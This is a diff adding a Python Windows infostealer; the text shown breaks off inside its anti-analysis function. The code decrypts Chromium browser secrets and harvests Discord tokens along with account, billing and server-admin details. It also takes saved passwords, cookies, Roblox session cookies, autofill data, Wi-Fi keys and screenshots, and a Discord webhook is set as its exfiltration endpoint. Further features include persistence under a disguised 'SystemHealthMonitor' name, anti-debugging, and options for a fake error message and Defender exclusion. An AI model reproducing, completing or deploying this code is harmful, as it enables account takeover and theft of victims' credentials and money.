@@ -1,0 +1,1707 @@
+import os
+import re
+import sys
+import json
+import base64
+import ctypes
+import ctypes.wintypes
+import shutil
+import sqlite3
+import platform
+import winreg
+import subprocess
+import threading
+import struct
+import io
+import zlib
+import ssl
+from datetime import datetime, timezone
+from urllib.request import Request, urlopen
+from urllib.error import URLError, HTTPError
+from urllib.parse import urlencode
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+_SSL_CTX = ssl.create_default_context()
+try:
+    _SSL_CTX.load_default_certs()
+except Exception:
+    _SSL_CTX = ssl._create_unverified_context()
+
+def debug_log(msg):
+    try:
+        with open(os.path.join(TEMP, "bl_debug.log"), "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] [PID:{os.getpid()}] {msg}\n")
+    except:
+        pass
+CONFIG = {
+    'webhook': 'https://discord.com/api/webhooks/1567946869697421374/usNGNvo9cjgHR7-dX20rkaEB32OzYVdVYCoqeD2BiM0FwLtaS4KfOdBgWKogOVc-e736',
+    'grab_tokens': True,
+    'grab_passwords': True,
+    'grab_cookies': False,
+    'grab_history': False,
+    'grab_sysinfo': False,
+    'grab_screenshot': False,
+    'grab_wifi': False,
+    'grab_roblox': False,
+    'grab_autofill': False,
+    'grab_extensions': False,
+    'grab_product_keys': False,
+    'grab_software': False,
+    'persistence': False,
+    'anti_vm': False,
+    'anti_debug': False,
+    'anti_analysis': False,
+    'uac_bypass': False,
+    'kill_browsers': False,
+    'defender_exclusion': False,
+    'self_destruct': False,
+    'startup_delay': 0,
+    'fake_error': False,
+    'fake_error_msg': 'This program requires MSVCP140.dll which was not found.',
+    'enable_disguise': False,
+    'disguise_type': 'cli',
+}
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+TEMP = os.getenv("TEMP")
+BROWSERS = {
+    "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
+    "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
+    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
+    "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
+    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
+    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+    "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+}
+DISCORD_PATHS = {
+    "Discord": os.path.join(ROAMING, "discord"),
+    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
+    "Discord PTB": os.path.join(ROAMING, "discordptb"),
+}
+class DataBlob(ctypes.Structure):
+    _fields_ = [
+        ("cbData", ctypes.c_ulong),
+        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
+    ]
+def dpapi_decrypt(data):
+    blob_in = DataBlob(
+        len(data),
+        ctypes.cast(
+            ctypes.create_string_buffer(data, len(data)),
+            ctypes.POINTER(ctypes.c_ubyte),
+        ),
+    )
+    blob_out = DataBlob()
+    if ctypes.windll.crypt32.CryptUnprotectData(
+        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
+    ):
+        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+        return result
+    return None
+def get_master_key(browser_path):
+    local_state = os.path.join(browser_path, "Local State")
+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, "r", encoding="utf-8") as f:
+            data = json.loads(f.read())
+        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
+        return dpapi_decrypt(encrypted_key)
+    except Exception:
+        return None
+
+BCRYPT_AES_ALGORITHM = "AES"
+BCRYPT_CHAINING_MODE = "ChainingMode"
+BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM"
+BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength"
+
+_bcrypt = ctypes.windll.bcrypt
+
+class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
+    _fields_ = [
+        ("cbSize", ctypes.c_ulong),
+        ("dwInfoVersion", ctypes.c_ulong),
+        ("pbNonce", ctypes.c_void_p),
+        ("cbNonce", ctypes.c_ulong),
+        ("pbAuthData", ctypes.c_void_p),
+        ("cbAuthData", ctypes.c_ulong),
+        ("pbTag", ctypes.c_void_p),
+        ("cbTag", ctypes.c_ulong),
+        ("pbMacContext", ctypes.c_void_p),
+        ("cbMacContext", ctypes.c_ulong),
+        ("cbAAD", ctypes.c_ulong),
+        ("cbData", ctypes.c_ulonglong),
+        ("dwFlags", ctypes.c_ulong),
+    ]
+
+def _bcrypt_aes_gcm_decrypt(key, nonce, ciphertext, tag):
+    hAlg = ctypes.c_void_p()
+    status = _bcrypt.BCryptOpenAlgorithmProvider(
+        ctypes.byref(hAlg),
+        BCRYPT_AES_ALGORITHM,
+        None,
+        0,
+    )
+    if status != 0:
+        return None
+    try:
+        mode = BCRYPT_CHAIN_MODE_GCM.encode("utf-16-le")
+        _bcrypt.BCryptSetProperty(
+            hAlg,
+            BCRYPT_CHAINING_MODE,
+            mode,
+            len(mode),
+            0,
+        )
+        hKey = ctypes.c_void_p()
+        key_buf = (ctypes.c_ubyte * len(key))(*key)
+        status = _bcrypt.BCryptGenerateSymmetricKey(
+            hAlg,
+            ctypes.byref(hKey),
+            None,
+            0,
+            key_buf,
+            len(key),
+            0,
+        )
+        if status != 0:
+            return None
+        try:
+            nonce_buf = (ctypes.c_ubyte * len(nonce))(*nonce)
+            tag_buf = (ctypes.c_ubyte * len(tag))(*tag)
+            ct_buf = (ctypes.c_ubyte * len(ciphertext))(*ciphertext)
+            pt_buf = (ctypes.c_ubyte * len(ciphertext))()
+
+            auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
+            auth_info.cbSize = ctypes.sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)
+            auth_info.dwInfoVersion = 1
+            auth_info.pbNonce = ctypes.addressof(nonce_buf)
+            auth_info.cbNonce = len(nonce)
+            auth_info.pbTag = ctypes.addressof(tag_buf)
+            auth_info.cbTag = len(tag)
+
+            cbResult = ctypes.c_ulong(0)
+            status = _bcrypt.BCryptDecrypt(
+                hKey,
+                ct_buf,
+                len(ciphertext),
+                ctypes.byref(auth_info),
+                None,
+                0,
+                pt_buf,
+                len(ciphertext),
+                ctypes.byref(cbResult),
+                0,
+            )
+            if status != 0:
+                return None
+            return bytes(pt_buf[:cbResult.value])
+        finally:
+            _bcrypt.BCryptDestroyKey(hKey)
+    finally:
+        _bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)
+
+def aes_decrypt(buff, key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:-16]
+        tag = buff[-16:]
+        result = _bcrypt_aes_gcm_decrypt(key, iv, payload, tag)
+        if result:
+            return result.decode("utf-8", errors="ignore")
+    except Exception:
+        pass
+    try:
+        result = dpapi_decrypt(buff)
+        if result:
+            return result.decode("utf-8", errors="ignore")
+    except Exception:
+        pass
+    return None
+def get_profiles(browser_path):
+    if not os.path.exists(browser_path):
+        return []
+    default = os.path.join(browser_path, "Default")
+    if os.path.isdir(default):
+        profiles = ["Default"]
+        for item in os.listdir(browser_path):
+            if item.startswith("Profile ") and os.path.isdir(
+                os.path.join(browser_path, item)
+            ):
+                profiles.append(item)
+        return profiles
+    return [""]
+
+_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+def _http_get(url, headers=None, timeout=10):
+    hdrs = dict(_DEFAULT_HEADERS)
+    if headers:
+        hdrs.update(headers)
+    req = Request(url, headers=hdrs)
+    try:
+        resp = urlopen(req, timeout=timeout, context=_SSL_CTX)
+        return resp.status, resp.read()
+    except HTTPError as e:
+        return e.code, e.read()
+    except Exception:
+        return 0, b""
+
+def _http_get_json(url, headers=None, timeout=10):
+    code, body = _http_get(url, headers, timeout)
+    if code == 200:
+        return json.loads(body)
+    return None
+
+def validate_token(token):
+    try:
+        code, _ = _http_get(
+            "https://discord.com/api/v9/users/@me",
+            headers={"Authorization": token},
+            timeout=5,
+        )
+        return code == 200
+    except Exception:
+        return False
+def get_user_info(token):
+    headers = {"Authorization": token}
+    info = {}
+    try:
+        data = _http_get_json(
+            "https://discord.com/api/v9/users/@me", headers=headers, timeout=5
+        )
+        if data:
+            d = data
+            if d.get("discriminator", "0") != "0":
+                info["username"] = f"{d['username']}#{d['discriminator']}"
+            else:
+                info["username"] = d.get("global_name") or d["username"]
+            info["id"] = d.get("id")
+            info["email"] = d.get("email") or "None"
+            info["phone"] = d.get("phone") or "None"
+            info["mfa"] = d.get("mfa_enabled", False)
+            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
+            info["nitro"] = nitro_map.get(d.get("premium_type", 0), "Unknown")
+    except Exception:
+        pass
+    try:
+        data = _http_get_json(
+            "https://discord.com/api/v9/users/@me/billing/payment-sources",
+            headers=headers,
+            timeout=5,
+        )
+        if data is not None:
+            info["billing"] = len(data) > 0
+        else:
+            info["billing"] = False
+    except Exception:
+        info["billing"] = False
+    return info
+def get_admin_guilds(token):
+    admin_guilds = []
+    try:
+        headers = {"Authorization": token}
+        debug_log("get_admin_guilds: fetching guilds...")
+        data = _http_get_json(
+            "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
+            headers=headers,
+            timeout=10,
+        )
+        if data is None:
+            debug_log("get_admin_guilds: failed to fetch guilds")
+            return admin_guilds
+        guilds = data
+        debug_log(f"get_admin_guilds: total guilds={len(guilds)}")
+        for guild in guilds:
+            perms = int(guild.get("permissions", 0))
+            is_owner = guild.get("owner", False)
+            if is_owner or (perms & 0x8):
+                debug_log(f"get_admin_guilds: ADMIN match: {guild.get('name')} owner={is_owner} perms={perms} perm_raw={guild.get('permissions')}")
+            if not (is_owner or (perms & 0x8)):
+                continue
+            entry = {
+                "name": guild.get("name", "Unknown"),
+                "id": guild["id"],
+                "members": str(guild.get("approximate_member_count", "?")),
+            }
+            if entry["members"] == "?":
+                try:
+                    preview = _http_get_json(
+                        f"https://discord.com/api/v9/guilds/{guild['id']}/preview",
+                        headers=headers,
+                        timeout=5,
+                    )
+                    if preview:
+                        entry["members"] = str(preview.get("approximate_member_count", "?"))
+                except Exception:
+                    pass
+            admin_guilds.append(entry)
+        debug_log(f"get_admin_guilds: found {len(admin_guilds)} admin guilds")
+    except Exception as e:
+        debug_log(f"get_admin_guilds: EXCEPTION: {e}")
+    return admin_guilds
+def _validate_and_enrich(token, source):
+    if not validate_token(token):
+        return None
+    info = get_user_info(token)
+    guilds = get_admin_guilds(token)
+    return {"source": source, "token": token, "user_info": info, "admin_guilds": guilds}
+def grab_tokens():
+    candidates = {}
+    all_paths = {}
+    for name, path in DISCORD_PATHS.items():
+        if os.path.exists(path):
+            all_paths[name] = {
+                "leveldb": os.path.join(path, "Local Storage", "leveldb"),
+                "local_state": path,
+            }
+    for name, path in BROWSERS.items():
+        if not os.path.exists(path):
+            continue
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            leveldb = os.path.join(profile_path, "Local Storage", "leveldb")
+            if os.path.exists(leveldb):
+                label = f"{name} ({profile})" if profile else name
+                all_paths[label] = {"leveldb": leveldb, "local_state": path}
+    for source, paths in all_paths.items():
+        if not os.path.exists(paths["leveldb"]):
+            continue
+        key = get_master_key(paths["local_state"])
+        for filename in os.listdir(paths["leveldb"]):
+            if not filename.endswith((".ldb", ".log")):
+                continue
+            filepath = os.path.join(paths["leveldb"], filename)
+            try:
+                with open(filepath, "r", errors="ignore") as f:
+                    content = f.read()
+            except Exception:
+                continue
+            if key:
+                for match in re.findall(r"dQw4w9WgXcQ:([^\s\"',\}\]]+)", content):
+                    try:
+                        token_bytes = base64.b64decode(match)
+                        token = aes_decrypt(token_bytes, key)
+                        if token and token not in candidates:
+                            candidates[token] = source
+                    except Exception:
+                        pass
+            for pattern in [
+                r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}",
+                r"mfa\.[\w-]{84}",
+            ]:
+                for match in re.findall(pattern, content):
+                    if match not in candidates:
+                        candidates[match] = source
+    result = []
+    seen_ids = set()
+    with ThreadPoolExecutor(max_workers=8) as pool:
+        futures = {
+            pool.submit(_validate_and_enrich, token, source): token
+            for token, source in candidates.items()
+        }
+        for future in as_completed(futures):
+            entry = future.result()
+            if entry is None:
+                continue
+            uid = entry["user_info"].get("id")
+            if uid and uid in seen_ids:
+                continue
+            if uid:
+                seen_ids.add(uid)
+            result.append(entry)
+    return result
+def grab_passwords():
+    passwords = []
+    for name, path in BROWSERS.items():
+        key = get_master_key(path)
+        if not key:
+            continue
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            login_db = os.path.join(profile_path, "Login Data")
+            if not os.path.exists(login_db):
+                continue
+            temp = os.path.join(TEMP, f"bl_{name}_{profile}_ld.db")
+            try:
+                shutil.copy2(login_db, temp)
+                conn = sqlite3.connect(temp)
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT origin_url, username_value, password_value FROM logins"
+                )
+                for url, username, encrypted_pw in cursor.fetchall():
+                    if url and username and encrypted_pw:
+                        pw = aes_decrypt(encrypted_pw, key)
+                        if pw:
+                            passwords.append(
+                                {
+                                    "browser": name,
+                                    "url": url,
+                                    "username": username,
+                                    "password": pw,
+                                }
+                            )
+                conn.close()
+            except Exception:
+                pass
+            finally:
+                try:
+                    os.remove(temp)
+                except Exception:
+                    pass
+    return passwords
+def grab_cookies():
+    cookies = []
+    for name, path in BROWSERS.items():
+        key = get_master_key(path)
+        if not key:
+            continue
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            cookie_db = os.path.join(profile_path, "Network", "Cookies")
+            if not os.path.exists(cookie_db):
+                cookie_db = os.path.join(profile_path, "Cookies")
+            if not os.path.exists(cookie_db):
+                continue
+            temp = os.path.join(TEMP, f"bl_{name}_{profile}_ck.db")
+            try:
+                shutil.copy2(cookie_db, temp)
+                conn = sqlite3.connect(temp)
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT host_key, name, encrypted_value, expires_utc FROM cookies"
+                )
+                for host, cname, encrypted_val, expires in cursor.fetchall():
+                    if encrypted_val:
+                        val = aes_decrypt(encrypted_val, key)
+                        if val:
+                            cookies.append(
+                                {
+                                    "browser": name,
+                                    "host": host,
+                                    "name": cname,
+                                    "value": val,
+                                    "expires": str(expires),
+                                }
+                            )
+                conn.close()
+            except Exception:
+                pass
+            finally:
+                try:
+                    os.remove(temp)
+                except Exception:
+                    pass
+    return cookies
+def grab_history():
+    history = []
+    for name, path in BROWSERS.items():
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            history_db = os.path.join(profile_path, "History")
+            if not os.path.exists(history_db):
+                continue
+            temp = os.path.join(TEMP, f"bl_{name}_{profile}_hist.db")
+            try:
+                shutil.copy2(history_db, temp)
+                conn = sqlite3.connect(temp)
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 50"
+                )
+                for url, title, visits in cursor.fetchall():
+                    history.append(
+                        {
+                            "browser": name,
+                            "url": url,
+                            "title": title or "",
+                            "visits": visits,
+                        }
+                    )
+                conn.close()
+            except Exception:
+                pass
+            finally:
+                try:
+                    os.remove(temp)
+                except Exception:
+                    pass
+    return history
+def grab_wifi():
+    wifi_data = []
+    try:
+        output = subprocess.check_output(
+            "netsh wlan show profiles",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode("utf-8", errors="ignore")
+        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
+        for profile in profiles:
+            profile = profile.strip()
+            try:
+                result = subprocess.check_output(
+                    f'netsh wlan show profile name="{profile}" key=clear',
+                    shell=True,
+                    stderr=subprocess.DEVNULL,
+                ).decode("utf-8", errors="ignore")
+                pw_match = re.findall(r"Key Content\s*:\s*(.*)", result)
+                password = pw_match[0].strip() if pw_match else ""
+                auth_match = re.findall(r"Authentication\s*:\s*(.*)", result)
+                auth = auth_match[0].strip() if auth_match else "Unknown"
+                wifi_data.append(
+                    {"ssid": profile, "password": password, "auth": auth}
+                )
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return wifi_data
+def grab_roblox():
+    roblox_cookies = []
+    for name, path in BROWSERS.items():
+        key = get_master_key(path)
+        if not key:
+            continue
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            cookie_db = os.path.join(profile_path, "Network", "Cookies")
+            if not os.path.exists(cookie_db):
+                cookie_db = os.path.join(profile_path, "Cookies")
+            if not os.path.exists(cookie_db):
+                continue
+            temp = os.path.join(TEMP, f"bl_{name}_{profile}_rblx.db")
+            try:
+                shutil.copy2(cookie_db, temp)
+                conn = sqlite3.connect(temp)
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT host_key, name, encrypted_value FROM cookies "
+                    "WHERE name = '.ROBLOSECURITY'"
+                )
+                for host, cname, encrypted_val in cursor.fetchall():
+                    if encrypted_val:
+                        val = aes_decrypt(encrypted_val, key)
+                        if val:
+                            roblox_cookies.append(
+                                {"browser": name, "cookie": val}
+                            )
+                conn.close()
+            except Exception:
+                pass
+            finally:
+                try:
+                    os.remove(temp)
+                except Exception:
+                    pass
+    return roblox_cookies
+def grab_autofill():
+    autofill = []
+    for name, path in BROWSERS.items():
+        key = get_master_key(path)
+        if not key:
+            continue
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            webdata_db = os.path.join(profile_path, "Web Data")
+            if not os.path.exists(webdata_db):
+                continue
+            temp = os.path.join(TEMP, f"bl_{name}_{profile}_af.db")
+            try:
+                shutil.copy2(webdata_db, temp)
+                conn = sqlite3.connect(temp)
+                cursor = conn.cursor()
+                cursor.execute(
+                    "SELECT name, value, count FROM autofill "
+                    "ORDER BY count DESC LIMIT 200"
+                )
+                for field_name, value, count in cursor.fetchall():
+                    if field_name and value:
+                        autofill.append({
+                            "browser": name,
+                            "field": field_name,
+                            "value": value,
+                            "count": count,
+                        })
+                conn.close()
+            except Exception:
+                pass
+            finally:
+                try:
+                    os.remove(temp)
+                except Exception:
+                    pass
+    return autofill
+def grab_extensions():
+    extensions = []
+    for name, path in BROWSERS.items():
+        for profile in get_profiles(path):
+            profile_path = os.path.join(path, profile) if profile else path
+            ext_dir = os.path.join(profile_path, "Extensions")
+            if not os.path.isdir(ext_dir):
+                continue
+            try:
+                for ext_id in os.listdir(ext_dir):
+                    ext_path = os.path.join(ext_dir, ext_id)
+                    if not os.path.isdir(ext_path):
+                        continue
+                    versions = sorted(os.listdir(ext_path), reverse=True)
+                    for ver in versions:
+                        manifest = os.path.join(ext_path, ver, "manifest.json")
+                        if os.path.exists(manifest):
+                            try:
+                                with open(manifest, "r", encoding="utf-8", errors="ignore") as f:
+                                    mdata = json.loads(f.read())
+                                ext_name = mdata.get("name", ext_id)
+                                if ext_name.startswith("__MSG_"):
+                                    ext_name = ext_id
+                                extensions.append({
+                                    "browser": name,
+                                    "name": ext_name,
+                                    "version": mdata.get("version", "?"),
+                                    "id": ext_id,
+                                    "description": (mdata.get("description", "") or "")[:80],
+                                })
+                            except Exception:
+                                pass
+                            break
+            except Exception:
+                pass
+    return extensions
+def grab_product_keys():
+    keys = []
+    try:
+        output = subprocess.check_output(
+            "wmic path softwarelicensingservice get OA3xOriginalProductKey",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode("utf-8", errors="ignore")
+        for line in output.split("\n"):
+            line = line.strip()
+            if line and line.lower() != "oa3xoriginalproductkey" and len(line) > 10:
+                keys.append({"product": "Windows (OEM)", "key": line})
+    except Exception:
+        pass
+    try:
+        output = subprocess.check_output(
+            'wmic path SoftwareLicensingProduct where '
+            '"PartialProductKey is not null" '
+            'get Name,PartialProductKey /format:csv',
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode("utf-8", errors="ignore")
+        for line in output.split("\n"):
+            parts = line.strip().split(",")
+            if len(parts) >= 3 and parts[1] and parts[1].lower() != "name":
+                keys.append({"product": parts[1][:60], "key": f"*****-{parts[2]}"})
+    except Exception:
+        pass
+    return keys
+def grab_software():
+    software = []
+    reg_paths = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+    ]
+    seen = set()
+    for hive, rpath in reg_paths:
+        try:
+            reg = winreg.OpenKey(hive, rpath)
+            i = 0
+            while True:
+                try:
+                    subkey_name = winreg.EnumKey(reg, i)
+                    try:
+                        subkey = winreg.OpenKey(reg, subkey_name)
+                        try:
+                            disp_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                        except Exception:
+                            disp_name = None
+                        if disp_name and disp_name not in seen:
+                            seen.add(disp_name)
+                            version = publisher = install_date = ""
+                            try:
+                                version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
+                            except Exception:
+                                pass
+                            try:
+                                publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
+                            except Exception:
+                                pass
+                            try:
+                                install_date = winreg.QueryValueEx(subkey, "InstallDate")[0]
+                            except Exception:
+                                pass
+                            software.append({
+                                "name": disp_name,
+                                "version": version or "?",
+                                "publisher": publisher or "?",
+                                "install_date": install_date or "?",
+                            })
+                        winreg.CloseKey(subkey)
+                    except Exception:
+                        pass
+                    i += 1
+                except OSError:
+                    break
+            winreg.CloseKey(reg)
+        except Exception:
+            pass
+    software.sort(key=lambda x: x["name"].lower())
+    return software
+def get_system_info():
+    info = {}
+    try:
+        _, body = _http_get("https://api.ipify.org", timeout=5)
+        info["ip"] = body.decode("utf-8", errors="ignore").strip()
+    except Exception:
+        info["ip"] = "Unknown"
+    try:
+        geo = _http_get_json(f"https://ipwho.is/{info['ip']}", timeout=5)
+        if geo and geo.get("success", False):
+            info["country"] = geo.get("country", "Unknown")
+            info["city"] = geo.get("city", "Unknown")
+            info["isp"] = geo.get("connection", {}).get("isp", "Unknown") or "Unknown"
+            info["timezone"] = geo.get("timezone", {}).get("id", "Unknown") or "Unknown"
+        else:
+            raise ValueError
+    except Exception:
+        try:
+            geo = _http_get_json(f"http://ip-api.com/json/{info['ip']}", timeout=5)
+            if geo:
+                info["country"] = geo.get("country", "Unknown")
+                info["city"] = geo.get("city", "Unknown")
+                info["isp"] = geo.get("isp", "Unknown")
+                info["timezone"] = geo.get("timezone", "Unknown")
+            else:
+                raise ValueError
+        except Exception:
+            info["country"] = info["city"] = info["isp"] = info["timezone"] = "Unknown"
+    info["hostname"] = os.getenv("COMPUTERNAME", "Unknown")
+    info["username"] = os.getenv("USERNAME", "Unknown")
+    info["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
+        )
+        info["cpu"] = winreg.QueryValueEx(key, "ProcessorNameString")[0].strip()
+        winreg.CloseKey(key)
+    except Exception:
+        info["cpu"] = "Unknown"
+    try:
+        output = subprocess.check_output(
+            "wmic path win32_VideoController get name",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        ).decode()
+        gpus = [
+            l.strip()
+            for l in output.split("\n")
+            if l.strip() and l.strip().lower() != "name"
+        ]
+        info["gpu"] = ", ".join(gpus) if gpus else "Unknown"
+    except Exception:
+        info["gpu"] = "Unknown"
+    try:
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", ctypes.c_ulong),
+                ("dwMemoryLoad", ctypes.c_ulong),
+                ("ullTotalPhys", ctypes.c_ulonglong),
+                ("ullAvailPhys", ctypes.c_ulonglong),
+                ("ullTotalPageFile", ctypes.c_ulonglong),
+                ("ullAvailPageFile", ctypes.c_ulonglong),
+                ("ullTotalVirtual", ctypes.c_ulonglong),
+                ("ullAvailVirtual", ctypes.c_ulonglong),
+                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+            ]
+        mem = MEMORYSTATUSEX()
+        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+        info["ram"] = f"{mem.ullTotalPhys // (1024 ** 3)} GB"
+    except Exception:
+        info["ram"] = "Unknown"
+    info["screen"] = (
+        f"{ctypes.windll.user32.GetSystemMetrics(0)}x"
+        f"{ctypes.windll.user32.GetSystemMetrics(1)}"
+    )
+    return info
+
+def take_screenshot():
+    try:
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+
+        user32.SetProcessDPIAware()
+
+        SM_XVIRTUALSCREEN = 76
+        SM_YVIRTUALSCREEN = 77
+        SM_CXVIRTUALSCREEN = 78
+        SM_CYVIRTUALSCREEN = 79
+
+        left = user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
+        top = user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
+        width = user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
+        height = user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
+
+        if width <= 0 or height <= 0:
+            width = user32.GetSystemMetrics(0)
+            height = user32.GetSystemMetrics(1)
+            left = 0
+            top = 0
+
+        hdc_screen = user32.GetDC(0)
+        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+        gdi32.SelectObject(hdc_mem, hbmp)
+
+        SRCCOPY = 0x00CC0020
+        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, left, top, SRCCOPY)
+
+        class BITMAPINFOHEADER(ctypes.Structure):
+            _fields_ = [
+                ("biSize", ctypes.c_uint32),
+                ("biWidth", ctypes.c_int32),
+                ("biHeight", ctypes.c_int32),
+                ("biPlanes", ctypes.c_uint16),
+                ("biBitCount", ctypes.c_uint16),
+                ("biCompression", ctypes.c_uint32),
+                ("biSizeImage", ctypes.c_uint32),
+                ("biXPelsPerMeter", ctypes.c_int32),
+                ("biYPelsPerMeter", ctypes.c_int32),
+                ("biClrUsed", ctypes.c_uint32),
+                ("biClrImportant", ctypes.c_uint32),
+            ]
+
+        bmi = BITMAPINFOHEADER()
+        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bmi.biWidth = width
+        bmi.biHeight = -height
+        bmi.biPlanes = 1
+        bmi.biBitCount = 32
+        bmi.biCompression = 0
+        bmi.biSizeImage = width * height * 4
+
+        pixels = ctypes.create_string_buffer(bmi.biSizeImage)
+        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, pixels, ctypes.byref(bmi), 0)
+
+        gdi32.DeleteObject(hbmp)
+        gdi32.DeleteDC(hdc_mem)
+        user32.ReleaseDC(0, hdc_screen)
+
+        raw = pixels.raw
+        rgb_rows = []
+        stride = width * 4
+        for y in range(height):
+            row = bytearray()
+            offset = y * stride
+            for x in range(width):
+                px = offset + x * 4
+                b = raw[px]
+                g = raw[px + 1]
+                r = raw[px + 2]
+                row.extend([r, g, b])
+            rgb_rows.append(bytes(row))
+
+        def _write_png(w, h, rows, out_path):
+            def _crc32(data):
+                return zlib.crc32(data) & 0xFFFFFFFF
+
+            with open(out_path, "wb") as f:
+                f.write(b"\x89PNG\r\n\x1a\n")
+
+                ihdr_data = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
+                chunk = b"IHDR" + ihdr_data
+                f.write(struct.pack(">I", len(ihdr_data)))
+                f.write(chunk)
+                f.write(struct.pack(">I", _crc32(chunk)))
+
+                raw_data = b""
+                for row in rows:
+                    raw_data += b"\x00" + row
+                compressed = zlib.compress(raw_data, 6)
+                chunk = b"IDAT" + compressed
+                f.write(struct.pack(">I", len(compressed)))
+                f.write(chunk)
+                f.write(struct.pack(">I", _crc32(chunk)))
+
+                chunk = b"IEND"
+                f.write(struct.pack(">I", 0))
+                f.write(chunk)
+                f.write(struct.pack(">I", _crc32(chunk)))
+
+        path = os.path.join(TEMP, "bl_ss.png")
+        _write_png(width, height, rgb_rows, path)
+        return path
+    except Exception:
+        return None
+
+def install_persistence():
+    try:
+        if getattr(sys, "frozen", False):
+            src = sys.executable
+        else:
+            src = os.path.abspath(__file__)
+        dst = os.path.join(ROAMING, "Microsoft", "Windows", "SystemHealthMonitor.exe")
+        if not os.path.exists(dst):
+            shutil.copy2(src, dst)
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, dst)
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+def anti_debug():
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            sys.exit(0)
+    except Exception:
+        pass
+    try:
+        is_debugged = ctypes.c_int(0)
+        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
+            ctypes.windll.kernel32.GetCurrentProcess(),
+            ctypes.byref(is_debugged),
+        )
+        if is_debugged.value:
+            sys.exit(0)
+    except Exception:
+        pass
+    try:
+        debug_port = ctypes.c_ulong(0)
+        ctypes.windll.ntdll.NtQueryInformationProcess(
+            ctypes.windll.kernel32.GetCurrentProcess(),
+            7,
+            ctypes.byref(debug_port),
+            ctypes.sizeof(debug_port),
+            None,
+        )
+        if debug_port.value != 0:
+            sys.exit(0)
+    except Exception:
+        pass
+def anti_analysis():
+    analysis_procs = [
